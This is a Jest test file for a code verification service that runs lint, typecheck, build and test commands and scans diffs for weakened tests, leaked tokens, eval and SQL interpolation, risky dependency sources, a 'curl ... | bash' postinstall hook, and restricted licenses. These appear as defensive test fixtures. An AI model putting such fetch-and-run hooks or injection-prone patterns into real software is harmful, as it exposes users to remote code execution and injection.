import { VerificationService } from './verification.service';
import { TestSelectionService } from './test-selection.service';
import { TestWeakeningDetectorService } from './test-weakening-detector.service';
import { DependencyScanService } from './dependency-scan.service';
import { LicenseScanService } from './license-scan.service';
import { SecretScanService } from './secret-scan.service';
import { SastScanService } from './sast-scan.service';
import type { CommandRunnerService, CommandExecutionResult } from './command-runner.service';
import { mkdtemp, rm, writeFile, mkdir } from 'node:fs/promises';
import { join } from 'node:path';
import { tmpdir } from 'node:os';

describe('VerificationService', () => {
  let service: VerificationService;
  let commandRunnerMock: { run: jest.Mock<Promise<CommandExecutionResult>, [string, string, number?]> };

  beforeEach(() => {
    commandRunnerMock = {
      run: jest.fn(),
    };

    service = new VerificationService(
      commandRunnerMock as unknown as CommandRunnerService,
      new SecretScanService(),
      new SastScanService(),
      new DependencyScanService(),
      new LicenseScanService(),
      new TestSelectionService(),
      new TestWeakeningDetectorService(),
    );
  });

  it('runs configured commands and marks them passed', async () => {
    commandRunnerMock.run.mockResolvedValue({
      success: true,
      exitCode: 0,
      stdout: 'ok',
      stderr: '',
    });

    const result = await service.runChecks(
      {
        lintCommand: 'pnpm lint',
        typecheckCommand: 'pnpm typecheck',
        buildCommand: 'pnpm build',
        testCommand: 'pnpm test',
      },
      ['auth/login.ts'],
      '',
      '/tmp/project',
    );

    expect(result.passed).toBe(true);
    expect(result.checks['lint']).toBe('passed');
    expect(result.checks['typecheck']).toBe('passed');
    expect(result.checks['build']).toBe('passed');
    expect(result.checks['unit_tests']).toBe('passed');
    expect(commandRunnerMock.run).toHaveBeenCalledTimes(4);
  });

  it('emits per-check observer events while verification runs', async () => {
    commandRunnerMock.run.mockResolvedValue({
      success: true,
      exitCode: 0,
      stdout: 'ok',
      stderr: '',
    });
    const onCheckStarted = jest.fn();
    const onCheckCompleted = jest.fn();

    await service.runChecks(
      {
        lintCommand: 'pnpm lint',
        typecheckCommand: 'pnpm typecheck',
      },
      [],
      '',
      '/tmp/project',
      {
        onCheckStarted,
        onCheckCompleted,
      },
    );

    expect(onCheckStarted).toHaveBeenNthCalledWith(1, 'lint', 'pnpm lint');
    expect(onCheckStarted).toHaveBeenNthCalledWith(2, 'typecheck', 'pnpm typecheck');
    expect(onCheckCompleted).toHaveBeenCalledWith('test_selection', 'skipped');
    expect(onCheckCompleted).toHaveBeenCalledWith('test_weakening_check', 'passed');
    expect(onCheckCompleted).toHaveBeenCalledWith(
      'lint',
      'passed',
      expect.objectContaining({ exitCode: 0, stdout: 'ok' }),
    );
  });

  it('marks a command failed when execution fails', async () => {
    commandRunnerMock.run
      .mockResolvedValueOnce({
        success: true,
        exitCode: 0,
        stdout: '',
        stderr: '',
      })
      .mockResolvedValueOnce({
        success: false,
        exitCode: 2,
        stdout: '',
        stderr: 'typecheck failed',
      });

    const result = await service.runChecks(
      {
        lintCommand: 'pnpm lint',
        typecheckCommand: 'pnpm typecheck',
      },
      [],
      '',
      '/tmp/project',
    );

    expect(result.passed).toBe(false);
    expect(result.checks['lint']).toBe('passed');
    expect(result.checks['typecheck']).toBe('failed');
    expect(result.commandResults.typecheck?.exitCode).toBe(2);
  });

  it('fails immediately when test weakening is detected', async () => {
    const result = await service.runChecks(
      {
        testCommand: 'pnpm test',
      },
      [],
      '-    expect(result).toBe(42);',
      '/tmp/project',
    );

    expect(result.passed).toBe(false);
    expect(result.testWeakeningDetected).toBe(true);
    expect(result.checks['test_weakening_check']).toBe('failed');
    expect(commandRunnerMock.run).not.toHaveBeenCalled();
  });

  it('fails immediately when secret scan detects a credential-like token', async () => {
    const result = await service.runChecks(
      {
        testCommand: 'pnpm test',
      },
      [],
      '+ const token = "ghp_1234567890abcdefghijklmnop";',
      '/tmp/project',
    );

    expect(result.passed).toBe(false);
    expect(result.secretScanDetected).toBe(true);
    expect(result.checks['secret_scan']).toBe('failed');
    expect(result.secretScanFindings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          type: 'github_token',
        }),
      ]),
    );
    expect(commandRunnerMock.run).not.toHaveBeenCalled();
  });

  it('fails immediately when secret scan detects a modern npm token', async () => {
    const result = await service.runChecks(
      {
        testCommand: 'pnpm test',
      },
      [],
      '+ const npmToken = "npm_1234567890abcdefghijklmnopqrstuvwxyz";',
      '/tmp/project',
    );

    expect(result.passed).toBe(false);
    expect(result.secretScanDetected).toBe(true);
    expect(result.checks['secret_scan']).toBe('failed');
    expect(result.secretScanFindings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          type: 'npm_token',
        }),
      ]),
    );
    expect(commandRunnerMock.run).not.toHaveBeenCalled();
  });

  it('fails immediately when SAST scan detects a dangerous pattern', async () => {
    const result = await service.runChecks(
      {
        testCommand: 'pnpm test',
      },
      [],
      '+ const value = eval(userInput);',
      '/tmp/project',
    );

    expect(result.passed).toBe(false);
    expect(result.sastScanDetected).toBe(true);
    expect(result.checks['sast_scan']).toBe('failed');
    expect(result.sastScanFindings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          type: 'eval_usage',
        }),
      ]),
    );
    expect(commandRunnerMock.run).not.toHaveBeenCalled();
  });

  it('fails immediately when SAST scan detects templated SQL interpolation', async () => {
    const result = await service.runChecks(
      {
        testCommand: 'pnpm test',
      },
      [],
      '+ const query = `SELECT * FROM users WHERE id = ${userId}`;',
      '/tmp/project',
    );

    expect(result.passed).toBe(false);
    expect(result.sastScanDetected).toBe(true);
    expect(result.checks['sast_scan']).toBe('failed');
    expect(result.sastScanFindings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          type: 'sql_template_interpolation',
        }),
      ]),
    );
    expect(commandRunnerMock.run).not.toHaveBeenCalled();
  });

  it('fails immediately when dependency scan detects a risky dependency source', async () => {
    const result = await service.runChecks(
      {
        testCommand: 'pnpm test',
      },
      [],
      '+   "left-pad": "git+https://github.com/example/left-pad.git",',
      '/tmp/project',
    );

    expect(result.passed).toBe(false);
    expect(result.dependencyScanDetected).toBe(true);
    expect(result.checks['dependency_scan']).toBe('failed');
    expect(result.dependencyScanFindings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          type: 'remote_dependency_source',
        }),
      ]),
    );
    expect(commandRunnerMock.run).not.toHaveBeenCalled();
  });

  it('fails immediately when dependency scan detects a fetched bootstrap install script', async () => {
    const result = await service.runChecks(
      {
        testCommand: 'pnpm test',
      },
      [],
      '+   "postinstall": "curl -fsSL https://example.com/install.sh | bash",',
      '/tmp/project',
    );

    expect(result.passed).toBe(false);
    expect(result.dependencyScanDetected).toBe(true);
    expect(result.checks['dependency_scan']).toBe('failed');
    expect(result.dependencyScanFindings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          type: 'shell_bootstrap_script',
        }),
      ]),
    );
    expect(commandRunnerMock.run).not.toHaveBeenCalled();
  });

  it('fails immediately when license scan detects a restricted license declaration', async () => {
    const result = await service.runChecks(
      {
        testCommand: 'pnpm test',
      },
      [],
      '+   "license": "GPL-3.0",',
      '/tmp/project',
    );

    expect(result.passed).toBe(false);
    expect(result.licenseScanDetected).toBe(true);
    expect(result.checks['license_scan']).toBe('failed');
    expect(result.licenseScanFindings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          type: 'copyleft_license',
        }),
      ]),
    );
    expect(commandRunnerMock.run).not.toHaveBeenCalled();
  });

  it('fails immediately when license scan detects a restricted license in array form', async () => {
    const result = await service.runChecks(
      {
        testCommand: 'pnpm test',
      },
      [],
      '+   "licenses": ["MIT", "BUSL-1.1"],',
      '/tmp/project',
    );

    expect(result.passed).toBe(false);
    expect(result.licenseScanDetected).toBe(true);
    expect(result.checks['license_scan']).toBe('failed');
    expect(result.licenseScanFindings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          type: 'license_array_reference',
        }),
      ]),
    );
    expect(commandRunnerMock.run).not.toHaveBeenCalled();
  });

  it('prefers scoped package commands in a monorepo and skips scripts with missing tool deps', async () => {
    const root = await mkdtemp(join(tmpdir(), 'aicp-verification-'));

    try {
      await writeFile(
        join(root, 'package.json'),
        JSON.stringify({
          packageManager: 'pnpm@9.0.0',
          scripts: {
            lint: 'pnpm -r lint',
            typecheck: 'pnpm -r typecheck',
            build: 'pnpm -r build',
            test: 'pnpm -r test',
          },
        }),
      );
      await writeFile(join(root, 'pnpm-lock.yaml'), 'lockfileVersion: 9.0\n');
      await mkdir(join(root, 'apps/api'), { recursive: true });
      await writeFile(
        join(root, 'apps/api/package.json'),
        JSON.stringify({
          scripts: {
            lint: 'eslint src --ext .ts',
            typecheck: 'tsc --noEmit',
            build: 'nest build',
            test: 'jest',
          },
          devDependencies: {
            typescript: '^5.7.0',
            '@nestjs/cli': '^11.0.0',
            jest: '^29.7.0',
          },
        }),
      );

      commandRunnerMock.run.mockResolvedValue({
        success: true,
        exitCode: 0,
        stdout: 'ok',
        stderr: '',
      });

      const result = await service.runChecks(
        {
          lintCommand: 'pnpm lint',
          typecheckCommand: 'pnpm typecheck',
          buildCommand: 'pnpm build',
          testCommand: 'pnpm test',
          focusPaths: ['apps/api/src/**'],
        },
        [],
        '',
        root,
      );

      expect(result.checks['lint']).toBe('skipped');
      expect(result.checks['typecheck']).toBe('passed');
      expect(result.checks['build']).toBe('passed');
      expect(result.checks['unit_tests']).toBe('passed');
      expect(commandRunnerMock.run).toHaveBeenNthCalledWith(1, 'pnpm typecheck', join(root, 'apps/api'));
      expect(commandRunnerMock.run).toHaveBeenNthCalledWith(2, 'pnpm build', join(root, 'apps/api'));
      expect(commandRunnerMock.run).toHaveBeenNthCalledWith(3, 'pnpm test', join(root, 'apps/api'));
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  });

  it('uses brokered context allowed paths when explicit focus paths are absent', async () => {
    const root = await mkdtemp(join(tmpdir(), 'aicp-verification-brokered-'));

    try {
      await writeFile(join(root, 'package.json'), JSON.stringify({ packageManager: 'pnpm@9.0.0' }));
      await writeFile(join(root, 'pnpm-lock.yaml'), 'lockfileVersion: 9.0\n');
      await mkdir(join(root, 'apps/api'), { recursive: true });
      await writeFile(
        join(root, 'apps/api/package.json'),
        JSON.stringify({
          scripts: {
            typecheck: 'tsc --noEmit',
          },
          devDependencies: {
            typescript: '^5.7.0',
          },
        }),
      );

      commandRunnerMock.run.mockResolvedValue({
        success: true,
        exitCode: 0,
        stdout: 'ok',
        stderr: '',
      });

      const result = await service.runChecks(
        {
          typecheckCommand: 'pnpm typecheck',
          brokeredContext: {
            scope: {
              allowedPaths: ['apps/api/src/**'],
            },
          },
        },
        [],
        '',
        root,
      );

      expect(result.checks['typecheck']).toBe('passed');
      expect(commandRunnerMock.run).toHaveBeenCalledWith('pnpm typecheck', join(root, 'apps/api'));
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  });
});
